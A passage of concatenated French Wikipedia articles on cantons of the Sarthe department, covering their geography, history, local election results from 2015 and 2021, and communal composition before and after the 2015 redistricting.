Ce canton était organisé autour de Saint-Paterne dans l'arrondissement de Mamers. Son altitude variait de 73 m (Fyé) à 242 m (Ancinnes) pour une altitude moyenne de 165 m.
Histoire.
De 1833 à 1848, les cantons de La Fresnaye et de Saint-Paterne avaient le même conseiller général. Le nombre de conseillers généraux était limité à trente par département.
Représentation.
Conseillers généraux de 1833 à 2015.
Jacques Tirouflet a été nommé conseiller général honoraire du canton par arrêté préfectoral du .
Le canton participe à l'élection du député de la première circonscription de la Sarthe.
Composition.
Le canton de Saint-Paterne comptait en 2012 (population municipale) et regroupait dix-sept communes :
À la suite du redécoupage des cantons pour 2015, les communes d'Arçonnay, Champfleur, Le Chevain et Saint-Paterne sont rattachées au canton de Mamers et les communes d'Ancinnes, Bérus, Béthon, Bourg-le-Roi, Chérisay, Fyé, Gesnes-le-Gandelin, Grandchamp, Livet-en-Saosnois, Moulins-le-Carbonnel, Oisseau-le-Petit, Rouessé-Fontaine et Thoiré-sous-Contensor à celui de Sillé-le-Guillaume.
Contrairement à beaucoup d'autres cantons, le canton de Saint-Paterne n'incluait aucune commune supprimée depuis la création des communes sous la Révolution.

</doc>
<doc id="191859" url="https://fr.wikipedia.org/wiki?curid=191859" title="Canton de Marolles-les-Braults">
Canton de Marolles-les-Braults

Le canton de Marolles-les-Braults est une ancienne division administrative française située dans le département de la Sarthe et la région Pays de la Loire.
Géographie.
Ce canton était organisé autour de Marolles-les-Braults dans l'arrondissement de Mamers. Son altitude variait de 53 m (Congé-sur-Orne) à 159 m (Courgains) pour une altitude moyenne de 87 m.
Représentation.
Conseillers généraux de 1833 à 2015.
Le canton participe à l'élection du député de la cinquième circonscription de la Sarthe.
Composition.
Le canton de Marolles-les-Braults comptait en 2012 (population municipale) regroupait dix-sept communes :
À la suite du redécoupage des cantons pour 2015, toutes les communes sont rattachées au canton de Mamers.
Anciennes communes.
L'ancienne commune de Ponthouin, absorbée en 1964 par Mézières-sous-Ballon, qui prend en 1965 le nom de "Mézières-sur-Ponthouin", était la seule commune supprimée depuis la création des communes sous la Révolution incluse dans le territoire du canton de Marolles-les-Braults.

</doc>
<doc id="191860" url="https://fr.wikipedia.org/wiki?curid=191860" title="Canton de Mamers">
Canton de Mamers

Le canton de Mamers est une division administrative française située dans le département de la Sarthe et la région Pays de la Loire.
À la suite du redécoupage cantonal de 2014, les limites territoriales du canton sont remaniées. Le nombre de communes du canton passe de 18 à 46.
Géographie.
Ce canton est organisé autour de Mamers dans l'arrondissement de Mamers. Son altitude varie de (Saint-Cosme-en-Vairais) à (Villaines-la-Carelle) pour une altitude moyenne de .
Représentation.
Conseillers généraux de 1833 à 2015.
Le canton participe à l'élection du député de la cinquième circonscription de la Sarthe.
Résultats détaillés.
Élections de mars 2015.
À l'issue du des élections départementales de 2015, deux binômes sont en ballottage : Frédéric Beauchef et Monique Nicolas Liberge (Union de la Droite, 43,77 %) et Irina Merel et Lionel Neveu (FN, 30,37 %). Le taux de participation est de 52,71 % ( sur ) contre 49,74 % au niveau départemental et 50,17 % au niveau national.
Au second tour, Frédéric Beauchef et Monique Nicolas Liberge (Union de la Droite) sont élus avec 64,11 % des suffrages exprimés et un taux de participation de 53,73 % ( pour et ).
Élections de juin 2021.
Le premier tour des élections départementales de 2021 est marqué par un très faible taux de participation (33,26 % au niveau national). Dans le canton de Mamers, ce taux de participation est de 32,34 % ( sur ) contre 29,78 % au niveau départemental. À l'issue de ce premier tour, deux binômes sont en ballottage : Frederic Beauchef et Monique Nicolas-Liberge (Union à droite, 53,97 %) et Éric de Vilmarest et Suzanne Hovasse (RN, 16,29 %).
Le second tour des élections est marqué une nouvelle fois par une abstention massive équivalente au premier tour. Les taux de participation sont de 34,36 % au niveau national, 30,67 % dans le département et 33,52 % dans le canton de Mamers. Frederic Beauchef et Monique Nicolas-Liberge (Union à droite) sont élus avec 79,65 % des suffrages exprimés ( pour et ).
Composition.
Composition avant 2015.
Le canton de Mamers regroupait dix-huit communes.
À la suite du redécoupage des cantons pour 2015, toutes les communes sont rattachées au nouveau territoire du canton de Mamers auquel s'ajoutent les sept communes du canton de La Fresnaye-sur-Chédouet, les dix-sept du canton de Marolles-les-Braults et quatre du canton de Saint-Paterne.
Anciennes communes.
Les anciennes communes suivantes étaient incluses dans le territoire du canton de Mamers antérieur à 2015 :
Composition depuis 2015.
Lors du redécoupage de 2014, le canton de Mamers regroupait quarante-six communes entières.
À la suite de la création des communes nouvelles de Saint-Paterne - Le Chevain au et de Marolles-les-Braults au , le canton comprend désormais quarante-quatre communes entières.

</doc>
<doc id="191861" url="https://fr.wikipedia.org/wiki?curid=191861" title="Canton de La Fresnaye-sur-Chédouet">
Canton de La Fresnaye-sur-Chédouet

Le canton de La Fresnaye-sur-Chédouet est une ancienne division administrative française située dans le département de la Sarthe et la région Pays de la Loire.
Géographie.
Ce canton était organisé autour de La Fresnaye-sur-Chédouet (Villeneuve-en-Perseigne) dans l'arrondissement de Mamers. Son altitude variait de (Neufchâtel-en-Saosnois) à (Louzes) pour une altitude moyenne de .
Représentation.
Conseillers généraux de 1833 à 2015.
De 1833 à 1848, les cantons de La Fresnaye et de Saint-Paterne avaient le même conseiller général. Le nombre de conseillers généraux était limité à 30 par département.
Le canton participe à l'élection du député de la cinquième circonscription de la Sarthe.
Au moment de son élection en 1945, Bernard d'Aillières avait été déclaré inéligible en raison de son vote en faveur des pleins pouvoirs au maréchal Philippe Pétain.
Michel d'Aillières a été nommé conseiller général honoraire du canton par arrêté préfectoral du .
Composition.
Le canton de La Fresnaye-sur-Chédouet comptait en 2012 (population municipale) et regroupait sept communes (douze avant la création de Villeneuve-en-Perseigne par fusion) :
À la suite du redécoupage des cantons pour 2015, toutes les communes sont rattachées au canton de Mamers.
Anciennes communes.
Les anciennes communes suivantes étaient incluses dans le canton de La Fresnaye-sur-Chédouet :

</doc>
<doc id="191862" url="https://fr.wikipedia.org/wiki?curid=191862" title="Canton de Fresnay-sur-Sarthe">
Canton de Fresnay-sur-Sarthe

Le canton de Fresnay-sur-Sarthe est une ancienne division administrative française située dans le département de la Sarthe et la région Pays de la Loire.
Géographie.
Ce canton était organisé autour de Fresnay-sur-Sarthe dans l'arrondissement de Mamers. Son altitude variait de (Moitron-sur-Sarthe) à (Saint-Paul-le-Gaultier) pour une altitude moyenne de .
Histoire.
L'époque gallo-romaine.
Il est difficile de dater l'apparition de la vie humaine sur le territoire du canton de Fresnay-sur-Sarthe.
Cependant, les écrits romains antiques nous apprennent que dès l'époque Gauloise, cette région , est occupée par deux des trois peuples de la confédération des Aulerques ; au sud et au centre de cette région les Aulerques Cénomans, dont la capitale -à l'époque gallo-romaine- portait le nom de "Vindunum" (aujourd'hui Le Mans, en Sarthe) et plus au nord les Aulerques Diablintes dont la capitale à cette même époque était "Noviodunum" (aujourd'hui Jublains, en Mayenne). Le troisième peuple gaulois de la confédération des Aulerques, les Éburoviques (dont la capitale était "Mediolanum", aujourd'hui Évreux) résidait dans l'actuel département de l'Eure. La conquête de la Gaule par Jules César et les troupes romaines (58 ) apporte son lot de transformations fondamentales au sein des peuples gaulois. Ces dernières adoptent les mœurs, la religion et les arts des vainqueurs. C'est la période de la "Pax Romana", paix et prospérité dont bénéficieront également les civitas aulerques et les villages environnants dont "Fraxinidum" (Fresnay-sur-Sarthe). Nombre de nouveaux monuments viennent orner les villes, ici et là de larges voies s'ouvrent pour relier entre elles les cités voisines. Le commerce se développe et les inégalités apparaissent entre habitants des villes et habitants de la campagne. Les massifs forestiers d'Andaine (Silva Andena), de Perseigne (Silva Persenia) et de Sillé-le-Guillaume sont de plus en plus exploités par les Gaulois qui se sont rendus maitres dans le domaine.
À ces développements matériels, viennent bientôt s'ajouter la diffusion de doctrines nouvelles, et notamment l'introduction du Christianisme vers le milieu du En effet, si les premières communautés chrétiennes sont attestées à Lyon dès le , il faut attendre le pour voir se multiplier les implantations locales vers l'ouest de la Gaule (an 250 à Tours, 290 à Nantes, etc. la Gaule demeurant majoritairement païenne jusqu'au ).
Toutefois dès le , les invasions barbares viennent changer le cours des événements ; les Saxons après leur cuisante victoire sur l'Armorique, s'installent dans le Pagus aujourd'hui le Saonois. Au début du , les Francs et les Suèves arrivent dans la région ; en 511 Clovis s'empare de la ville du Mans annexant ainsi tous le territoire à son royaume. Débute alors une période plus calme, durant laquelle une nouvelle société va se constituer, mêlant les ruines de l'Empire romain aux coutumes barbares, sous l'influence bien présente du Christianisme. Ainsi, en l'an 572, (Saint) Domnole, évêque du Mans, dote richement la nouvelle abbaye de Saint-Vincent d'un « autre domaine nommé Fraxinidum (Fresnai) avec ses vignes, forêts, prairies, pâturages, eaux et cours d’eau. » ("Histoire de l'église du Mans", 1857, Révérend Père Paul Léon Piolin, historien et Bénédictin de la Congrégation de France).
Le Moyen Âge.
À partir du , les campagnes reprennent de l'importance. La vie se développe autour de l'agriculture et le canton voit apparaitre les premiers domaines. De son côté l'Église qui comprend le danger que représentent les barbares et le paganisme, s'empare des campagnes où elle crée de nombreux monastères. C'est dans le "Pagus Silviaciniensis", que le christianisme semble prendre ses marques. L'ermite Léonard retiré à Vandœuvre (Saint-Léonard-des-Bois), fonde un important monastère à du village de Douillet-le-Joly, édifice dont il nous reste une pierre jonchant la rivière et qui semble-t-il serait le vestige d'un ancien tombeau. À la même époque, Céneri bâtit un autre monastère sur la colline qui portera plus tard son nom. La célébrité du monastère de Vandœuvre attire sur les rives de la Sarthe un certain nombre d'habitants, qui vont fonder de nombreux domaines agricoles, et qui en attirant des ouvriers, vont peu à peu former des hameaux et des villages. Il semble ainsi, que dès le existe un domaine agricole sur l'actuel emplacement du village de Douillet.
Le désordre réapparait à l'avènement du . Les Bretons menacent les frontières du comté du Maine et Charles Martel s'avance à l'ouest à la tête d'une importante armée. À cette époque, une troupe inconnue ravage les campagnes du canton, et le monastère fondé par saint Céneri est pillé. C'est Charlemagne qui rétablira l'ordre dans le Maine, qu'il viendra d'ailleurs visiter en 776. À la mort de ce dernier, saint Aldéric, évêque du Mans, s'attache à assurer le développement de l'agriculture, et l'extension de la religion chrétienne dans les campagnes. Aux alentours de l'an 840, le Maine est victime des invasions bretonne d'abord et normande ensuite, les monastères de Vandœuvre et de Saint-Céneri sont détruits, et les habitants trouvent refuge dans un oppidum au cœur de la forêt de Sillé-le-Guillaume. Cette situation instable va se prolonger durant tout le . À l'aube de l'An Mil, la société du Maine est sur le point de s'écrouler, comme ce fut le cas jadis au .
C'est durant la première moitié du que la situation se stabilise à nouveau. On assiste alors à une véritable « renaissance sociale », dont les changements se produisent sous deux formes. D'une part, la société religieuse se réorganise et les églises sont reconstruites, et d'autre part c'est l'avènement du système féodal, qui est de près suivi de la construction des premiers châteaux. De nombreux tombeaux en roussard en forme d'auge, sont retrouvés datant de cette époque, notamment à Douillet, Sougé-le-Ganelon et Saint-Céneri. Les églises ou chapelles des communes du canton sont fondées (Montreuil-le-Chétif, Moitron, Saint-Christophe-du-Jambet, Douillet...).
Le régime féodal commence à s'organiser. Le canton de Fresnay est divisé à l'instar du pays, en de multiples états indépendants. Le Maine se retrouve enclavé et la source de nombreuses convoitises qui font de lui une proie très disputée, autant par la ruse que par les armes. Sur toutes les frontières s'élèvent des forteresses (Saint-Céneri, Sillé-le-Guillaume, Fresnay-sur-Sarthe, Beaumont-sur-Sarthe, Assé-le-Boisne...).
Tout au long du le canton est le terrain de luttes acharnées entre maisons féodales. Les Manceaux et les Normands se mènent une guerre interminable qui ravage le pays. On peut d'ailleurs relever deux épisodes célèbres durant cette période troublée, que sont "la commune du [Mans]" en 1071, et l'attaque du château de Sillé. Le Maine voit passer Guillaume le Conquérant qui, s'étant rendu maître de l'Angleterre, arrive à la tête d'une puissante et nombreuse armée « d'aventuriers » anglais, ravis de pouvoir marcher sur les Manceaux, guidés par une volonté symbolique de « vengeance nationale ». Ils enlèvent le château de Fresnay, et plus tard celui de Sillé. Ils ravagent les campagnes du canton, et se livrent à toutes sortes de dévastations, « coupant les arbres, brûlant les hameaux, faisant au Maine tout le mal qu'ils auraient voulu faire à la Normandie ». Dix ans plus tard, le vicomte de Fresnay, Hubert de Beaumont-au-Maine, s'allie au comte d'Anjou contre Guillaume le Conquérant, et le Maine se trouve à nouveau dévasté par des conflits qui n'en finissent pas. Les combats qui se livrent tour à tour sous les murs de Fresnay, Saint Céneri et Sillé, sont suspendus par la prédication de la première croisade et le passage dans le Maine du Pape Urbain II, au mois de mars 1096. C'est à la mort de Guillaume le Roux en 1100 que la guerre se termine enfin, rendant ainsi la paix à toute la province.
À partir du , les guerres privées se font de plus en plus rares notamment entravées par les croisades. Ces dernières furent un élément déterminant de la vie sociale, économique et militaire du pays (commanderie du Gué-Lian à Moitron-sur-Sarthe). À cette même époque, Fresnay devient le chef-lieu du doyenné. On assiste à la mise en place du Clergé de campagne, accompagné de la construction d'églises, de presbytères et de prieurés. Le Maine tombe sous la domination de Richard Cœur de Lion, une tranquillité absolue règne alors sur le Maine et la Normandie. Les grands seigneurs sont absorbés par les croisades. Ce n'est qu'à partir du meurtre d'Arthur de Bretagne par le roi Jean sans Terre, lorsque Philippe Auguste eut résolu de confisquer le Maine et la Normandie, que la guerre vint de nouveau troubler le calme dans la région. C'est la première guerre nationale, entre la couronne d'Angleterre et celle de France. La victoire de Philippe Auguste eut pour conséquence de délivrer le Maine de l'influence anglo-normande.
Les premières chapelles, les églises de Fresnay, Saint-Christophe-du-Jambet, Ségrie et Douillet datent du . À l'orée du , la population rurale a sensiblement augmenté et de nombreux hameaux poussent ici et là. Les édifices religieux sont agrandis ou rénovés, et les églises se dotent de petits autels latéraux, tandis que les chœurs sont réaménagés. À cette époque et jusqu'au , la division territoriale du Maine s'intensifie, notamment par l'abolition du servage, et l'acquisition par de nouveaux petits propriétaires ruraux, de lopins de terre de moindre étendue, permettant ainsi le développement d'une classe de propriétaires terriens s'élevant à une nouvelle condition sociale par le travail de la terre. Les serfs deviennent des tenanciers libres. Il s'agit là de l'une des évolutions notables marquant le règne de saint Louis, et préparant notamment à la célèbre ordonnance de 1315 qui abolira définitivement le servage au sein du domaine royal. C'est également à cette période, à cheval sur le et le , que débute la guerre de Cent Ans. Le Maine est alors régulièrement dévasté, tantôt par des épidémies comme la peste noire autour de 1348, tantôt par la conquête, il est ravagé par les Anglo-Navarrais dès 1357 après la bataille de Poitiers.
Les forteresses de Fresnay et de Sillé-le-Guillaume tombent aux mains de l'ennemi. Le traité de Brétigny tentera mais en vain, de faire évacuer la ville de Fresnay par les Anglais, mais c'est Bertrand Du Guesclin qui par ses victoires militaires, finira par mettre les Anglais en fuite. Après la bataille d'Azincourt en 1415, le roi Henri V d'Angleterre entreprend la conquête de la Normandie puis du Maine, la contrée passe sous la domination des Anglais pendant une trentaine d'années, durant lesquelles se mêlent souffrances — la garnison anglaise de Fresnay est particulièrement sauvage — et courageuses révoltes, menées par deux vaillants soldats, Ambroise de Loré et le Bastard d'Alençon. Les Anglais de Fresnay pillent sans retenue, ils ruinent la noblesse et sont particulièrement cruels envers les paysans, si bien qu'en 1450, les villages du canton sont désertés, toutes les paroisses souffrent des excès de cruauté. Les terres ne sont plus cultivées, les bois sont incendiés, et la population est en partie décimée. Ceux qui restent détestent les Anglais, et finissent peu à peu par reprendre possession des villes et des villages. À l'image du pays tout entier dont l'économie est ruinée par la guerre, les campagnes se sont peu développées dans le Maine et sur le canton pendant la guerre de Cent Ans.
L'époque moderne.
À la fin du Moyen Âge, vers la fin du , le canton de Fresnay assiste à une période de prospérité. C'est au qu’apparaît la petite noblesse rurale et avec elle l'édification des premières demeures seigneuriales. La grande majorité des manoirs que l'on peut encore admirer aujourd'hui sur le canton ont été construits et habités par les seigneurs, à cette époque. C'est aussi l'essor des petites industries locales (minoteries, ateliers de tisserands, forges, moulins…). L'influence artistique de la Renaissance se traduit dans les campagnes à travers l'Église dont les bâtiments religieux font l'objet de modifications.
Peu touché par les guerres menées par François contre l'Espagne de Charles Quint et peu troublé par les débuts de la Réforme protestante, le Maine entre dans une période propice au développement économique. On assiste, avec l'essor des petites industries, à l'avènement d'une nouvelle classe sociale : celle des bourgeois ruraux (commerçants, artisans et petits patrons). L'arrivée d'Henri IV au pouvoir met fin aux remous des guerres de Religion et apporte un renforcement du pouvoir de l'État dans les contrées comme le Maine, avec la multiplication des impôts, l'établissement de la justice publique et la création de corps d'officiers publics, notamment dans le domaine notarial.
L'État renforce également son influence centralisée autour de Louis XIV : le grand Roi-Soleil, et la petite noblesse rurale déserte les campagnes provinciales pour s'établir dans les grandes agglomérations ou à la Cour du Roi ; elle est remplacée dans les campagnes par la petite bourgeoisie issue de la tranche supérieure du tiers état. Peu à peu, les fermiers généraux remplacent les anciens seigneurs. Mais si on s'amuse à la Cour du Roi, les campagnes du Maine ne sont pas épargnées par les impôts, la disette, la famine ou la rudesse de l'hiver. Éprouvée, la population souhaite des réformes. Au début de 1789, les habitants remplissent leurs cahiers de doléances et désignent leurs députés. Attachés au roi et respectueux de la religion, ils réclament avant tout une simplification des démarches administratives et une plus grande participation dans la gestion des affaires provinciales. Ils sont favorables à l'abolition des privilèges et réclament une amélioration des voies de communication. En 1790, on met en place les premières municipalités, certains curés sont contraints à céder leur place. La République est proclamée en 1792.
Les années qui suivent sont marquées par la guerre de Vendée et l'arrivée en Sarthe des Chouans, qui ne vont pas cesser d'inquiéter les populations locales et de semer la terreur sur le territoire. La situation se calme à l'avènement du Consulat puis de l'Empire, le district de Fresnay entre, malgré la conscription, dans une période de prospérité. La démographie évolue, la population augmente, puis diminue, c'est le temps des première migrations des campagnes vers les villes.
Représentation.
Conseillers généraux de 1833 à 2015.
Le canton participe à l'élection du député de la première circonscription de la Sarthe.
Composition.
Le canton de Fresnay-sur-Sarthe comptait en 2012 (population municipale et regroupait douze communes) :
À la suite du redécoupage des cantons pour 2015, toutes les communes sont rattachées au canton de Sillé-le-Guillaume.
Contrairement à beaucoup d'autres cantons, le canton de Fresnay-sur-Sarthe n'incluait aucune commune supprimée depuis la création des communes sous la Révolution.

</doc>
<doc id="191863" url="https://fr.wikipedia.org/wiki?curid=191863" title="Canton de la Ferté-Bernard">
Canton de la Ferté-Bernard

Le canton de la Ferté-Bernard est une division administrative française située dans le département de la Sarthe et la région Pays de la Loire.
À la suite du redécoupage cantonal de 2014, les limites territoriales du canton sont remaniées. Le nombre de communes du canton passe de 13 à 26.
Géographie.
Ce canton est organisé autour de La Ferté-Bernard dans l'arrondissement de Mamers. Son altitude varie de (Villaines-la-Gonais) à (Théligny) pour une altitude moyenne de .
Histoire.
Par décret du , le nombre de cantons du département est divisé par deux, avec mise en application aux élections départementales de mars 2015. Le canton de la Ferté-Bernard est conservé et s'agrandit. Il passe de 13 à 26 communes.
Représentation.
Conseillers généraux de 1833 à 2015.
Le canton participe à l'élection du député de la cinquième circonscription de la Sarthe.
Pierre Coutable a été nommé conseiller général honoraire du canton par arrêté préfectoral du .
Résultats détaillés.
Élections de mars 2015.
À l'issue du des élections départementales de 2015, deux binômes sont en ballottage : Jean-Carles Grelier et Marie-Thérèse Leroux (DVD, 51,06 %) et Elisabeth de Bourqueney et Jean-Jacques L'Hôte (FN, 27,69 %). Le taux de participation est de 50,06 % ( sur ) contre 49,74 % au niveau départemental et 50,17 % au niveau national.
Au second tour, Jean-Carles Grelier et Marie-Thérèse Leroux (DVD) sont élus avec 68,7 % des suffrages exprimés et un taux de participation de 49,97 % ( pour et ).
Jean-Carles Grelier a quitté LR et est membre d'Agir, la droite constructive, puis de Soyons libres, mouvement de Valérie Pécresse.
Élections de juin 2021.
Le premier tour des élections départementales de 2021 est marqué par un très faible taux de participation (33,26 % au niveau national). Dans le canton de la Ferté-Bernard, ce taux de participation est de 30,48 % ( sur ) contre 29,78 % au niveau départemental. À l'issue de ce premier tour, deux binômes sont en ballottage : Jean-Carles Grelier et Marie Thérèse Leroux (Union au centre et à droite, 55,68 %) et Anne-Marie Fouquet et Gilbert Zentar (RN, 18,94 %).
Le second tour des élections est marqué une nouvelle fois par une abstention massive équivalente au premier tour. Les taux de participation sont de 34,36 % au niveau national, 30,67 % dans le département et 30,82 % dans le canton de la Ferté-Bernard. Jean-Carles Grelier et Marie Thérèse Leroux (Union au centre et à droite) sont élus avec 77,68 % des suffrages exprimés ( pour et ).
Composition.
Composition avant 2015.
Le canton de la Ferté-Bernard regroupait treize communes.
À la suite du redécoupage des cantons pour 2015, toutes les communes sont à nouveau rattachées au canton de la Ferté-Bernard auquel s'ajoutent les treize communes du canton de Tuffé.
Ancienne commune.
La commune de Saint-Antoine-de-Rochefort, absorbée en 1886 par La Ferté-Bernard, était la seule commune supprimée, depuis la création des communes sous la Révolution, incluse dans le territoire du canton de la Ferté-Bernard antérieur à 2015. La commune de Cherré, absorbée en même temps, reprend son indépendance deux ans plus tard.
Composition depuis 2015.
Lors du redécoupage de 2014, le canton comptait vingt-six communes entières.
À la suite de la création des communes nouvelles de Tuffé Val de la Chéronne au et de Cherré-Au au , le canton comprend désormais vingt-quatre communes entières.

</doc>
<doc id="191864" url="https://fr.wikipedia.org/wiki?curid=191864" title="Canton de Bonnétable">
Canton de Bonnétable

Le canton de Bonnétable est une circonscription électorale française située dans le département de la Sarthe et la région Pays de la Loire.
Géographie.
Ce canton est organisé autour de Bonnétable dans les arrondissements de Mamers et du Mans. Son altitude varie de (Neuville-sur-Sarthe) à (Nogent-le-Bernard).
Représentation.
Conseillers généraux de 1833 à 2015.
Le canton participe à l'élection du député de la cinquième circonscription de la Sarthe.
Résultats détaillés.
Élections de mars 2015.
À l'issue du des élections départementales de 2015, trois binômes sont en ballottage : Véronique Cantin et Thierry Lemonnier (DVD, 38,77 %), Agnès Besnard et Yannick Rebre (PS, 26,26 %) et Didier Breton et Marie-Claude Deotto (FN, 26,24 %). Le taux de participation est de 51,63 % ( sur ) contre 49,74 % au niveau départemental et 50,17 % au niveau national.
Au second tour, Véronique Cantin et Thierry Lemonnier (DVD) sont élus avec 43,12 % des suffrages exprimés et un taux de participation de 54,34 % ( pour et ).
Élections de juin 2021.
Le premier tour des élections départementales de 2021 est marqué par un très faible taux de participation (33,26 % au niveau national). Dans le canton de Bonnétable, ce taux de participation est de 30,63 % ( sur ) contre 29,78 % au niveau départemental. À l'issue de ce premier tour, deux binômes sont en ballottage : Véronique Cantin et Thierry Lemonnier (DVD, 53,79 %) et Fabienne Pautonnier et Charles Zimmer (PS, 17,84 %).
Le second tour des élections est marqué une nouvelle fois par une abstention massive équivalente au premier tour. Les taux de participation sont de 34,36 % au niveau national, 30,67 % dans le département et 31,35 % dans le canton de Bonnétable. Véronique Cantin et Thierry Lemonnier (DVD) sont élus avec 74,37 % des suffrages exprimés ( pour et ).
Composition.
Composition avant 2015.
Le canton de Bonnétable regroupait huit communes.
À la suite du redécoupage des cantons pour 2015, toutes les communes sont à nouveau rattachées au canton de Bonnétable auquel s'ajoutent les treize communes du canton de Ballon, deux communes du canton du Mans-Nord-Campagne et une du canton du Mans-Nord-Ouest.
Anciennes communes.
Les anciennes communes suivantes étaient incluses dans le canton de Bonnétable :
Composition depuis 2015.
Après le redécoupage de 2014, le canton comptait vingt-quatre communes entières.
À la suite de la création de la commune nouvelle de Ballon-Saint Mars au , par regroupement entre Ballon et Saint-Mars-sous-Ballon, le canton comprend désormais vingt-trois communes entières.

</doc>
<doc id="191865" url="https://fr.wikipedia.org/wiki?curid=191865" title="Canton de Beaumont-sur-Sarthe">
Canton de Beaumont-sur-Sarthe

Le canton de Beaumont-sur-Sarthe est une ancienne division administrative française située dans le département de la Sarthe et la région Pays de la Loire.
Géographie.
Ce canton était organisé autour de Beaumont-sur-Sarthe dans l'arrondissement de Mamers. Son altitude variait de 52 m (Saint-Marceau) à 197 m (Ségrie) pour une altitude moyenne de 107 m.
Représentation.
Conseillers généraux de 1833 à 2015.
Le canton participe à l'élection du député de la première circonscription de la Sarthe.
Composition.
Le canton de Beaumont-sur-Sarthe comptait en 2012 (population municipale) et regroupait quinze communes :
À la suite du redécoupage des cantons pour 2015, toutes les communes sont rattachées au canton de Sillé-le-Guillaume.
Contrairement à beaucoup d'autres cantons, le canton de Beaumont-sur-Sarthe n'incluait aucune commune supprimée depuis la création des communes sous la Révolution.

</doc>
<doc id="191866" url="https://fr.wikipedia.org/wiki?curid=191866" title="Canton de Sablé-sur-Sarthe">
Canton de Sablé-sur-Sarthe

Le canton de Sablé-sur-Sarthe est une division administrative française située dans le département de la Sarthe et la région Pays de la Loire.
À la suite du redécoupage cantonal de 2014, les limites territoriales du canton sont remaniées. Le nombre de communes du canton passe de 14 à 16.
Géographie.
Ce canton est organisé autour de Sablé-sur-Sarthe dans l'arrondissement de la Flèche. Son altitude varie de 20 m (Précigné) à 101 m (Souvigné-sur-Sarthe) pour une altitude moyenne de 42 m.
Histoire.
Par décret du , le nombre de cantons du département est divisé par deux, avec mise en application aux élections départementales de mars 2015. Le canton de Sablé-sur-Sarthe est conservé et s'agrandit. Il passe de 14 à 16 communes.
Représentation.
Conseillers d'arrondissement (de 1833 à 1940).
Le canton de Sablé avait deux conseillers d'arrondissement.
Conseillers généraux de 1833 à 2015.
 
Le canton participe à l'élection du député de la quatrième circonscription de la Sarthe.
François Fillon a été nommé conseiller général honoraire du canton par arrêté préfectoral du .
Résultats détaillés.
Élections de mars 2015.
À l'issue du des élections départementales de 2015, deux binômes sont en ballottage : Daniel Chevalier et Martine Crnkovic (Union de la Droite, 43,35 %) et Henri Delaune et Léonie Hemery (FN, 30,26 %). Le taux de participation est de 45,97 % ( sur ) contre 49,74 % au niveau départemental et 50,17 % au niveau national.
Au second tour, Daniel Chevalier et Martine Crnkovic (Union de la Droite) sont élus avec 64,95 % des suffrages exprimés et un taux de participation de 47,21 % ( pour et ).
Élections de juin 2021.
Le premier tour des élections départementales de 2021 est marqué par un très faible taux de participation (33,26 % au niveau national). Dans le canton de Sablé-sur-Sarthe, ce taux de participation est de 26,66 % ( sur ) contre 29,78 % au niveau départemental. À l'issue de ce premier tour, deux binômes sont en ballottage : Daniel Chevalier et Martine Crnkovic (Union à droite, 53,86 %) et Murielle David et Frédéric Jugnet (DVC, 16,75 %).
Le second tour des élections est marqué une nouvelle fois par une abstention massive équivalente au premier tour. Les taux de participation sont de 34,36 % au niveau national, 30,67 % dans le département et 27,04 % dans le canton de Sablé-sur-Sarthe. Daniel Chevalier et Martine Crnkovic (Union à droite) sont élus avec 72,43 % des suffrages exprimés ( pour et ).
Composition.
Composition avant 2015.
Le canton de Sablé-sur-Sarthe regroupait quatorze communes.
À la suite du redécoupage des cantons pour 2015, toutes les communes sont à nouveau rattachées au canton de Sablé-sur-Sarthe auquel s'ajoutent deux communes du canton de Malicorne-sur-Sarthe.
Ancienne commune.
La commune de Gastines-sur-Erve, absorbée en 1965 par Sablé-sur-Sarthe, est la seule commune supprimée, depuis la création des communes sous la Révolution, incluse dans le territoire du canton de Sablé-sur-Sarthe antérieur à 2015.
Composition depuis 2015.
Le canton regroupe seize communes suivantes entières.

</doc>
<doc id="191867" url="https://fr.wikipedia.org/wiki?curid=191867" title="Canton de Pontvallain">
Canton de Pontvallain

Le canton de Pontvallain est une ancienne division administrative française située dans le département de la Sarthe et la région Pays de la Loire.
Géographie.
Ce canton était organisé autour de Pontvallain dans l'arrondissement de La Flèche. Son altitude variait de 35 m (Mansigné) à 113 m (Cérans-Foulletourte) pour une altitude moyenne de 69 m.
Histoire.
De 1833 à 1848, les cantons de Mayet et de Pontvallain avaient le même conseiller général. Le nombre de conseillers généraux était limité à trente par département.
Représentation.
Conseillers généraux de 1833 à 2015.
Le canton participe à l'élection du député de la troisième circonscription de la Sarthe.
Composition.
Le canton de Pontvallain comptait en 2012 (population municipale) et regroupait neuf communes :
À la suite du redécoupage des cantons pour 2015, toutes les communes sont rattachées au canton du Lude.
Contrairement à beaucoup d'autres cantons, le canton de Pontvallain n'incluait aucune commune supprimée depuis la création des communes sous la Révolution.

</doc>
<doc id="191868" url="https://fr.wikipedia.org/wiki?curid=191868" title="Canton de Mayet">
Canton de Mayet

Le canton de Mayet est une ancienne division administrative française située dans le département de la Sarthe et la région Pays de la Loire.
Géographie.
Ce canton était organisé autour de Mayet dans l'arrondissement de la Flèche. Son altitude variait de 37 m (Aubigné-Racan) à 164 m (Mayet) pour une altitude moyenne de 68 m.
Histoire.
De 1833 à 1848, les cantons de Mayet et de Pontvallain avaient le même conseiller général. Le nombre de conseillers généraux était limité à trente par département.
Représentation.
Conseillers généraux de 1833 à 2015.
Le canton participe à l'élection du député de la troisième circonscription de la Sarthe.
Composition.
Le canton de Mayet comptait en 2012 (population municipale) et regroupait sept communes :
À la suite du redécoupage des cantons pour 2015, toutes les communes à l'exception de Lavernat sont rattachées au canton du Lude. La commune de Lavernat est intégrée au canton de Château-du-Loir.
Contrairement à beaucoup d'autres cantons, le canton de Mayet n'inclut aucune commune supprimée depuis la création des communes sous la Révolution.

</doc>
<doc id="191869" url="https://fr.wikipedia.org/wiki?curid=191869" title="Canton de Malicorne-sur-Sarthe">
Canton de Malicorne-sur-Sarthe

Le canton de Malicorne-sur-Sarthe est une ancienne division administrative française située dans le département de la Sarthe et la région Pays de la Loire.
Géographie.
Ce canton était organisé autour de Malicorne-sur-Sarthe dans l'arrondissement de La Flèche. Son altitude variait de 27 m (Dureil) à 108 m (Courcelles-la-Forêt) pour une altitude moyenne de 53 m.
Économie.
Les communes de Malicorne-sur-Sarthe, de Mézeray et de Noyen-sur-Sarthe sont les communes du canton offrant le plus de services à la population. Ces trois communes disposent notamment de zones artisanales.
Plus précisément, Noyen-sur-Sarthe dispose d'une zone artisanale accueillant 8 entreprises, d'une zone commerciale regroupant neuf entreprises et d'une zone industrielle où se situe l’unité de production de la literie Bultex du groupe international Copirel.
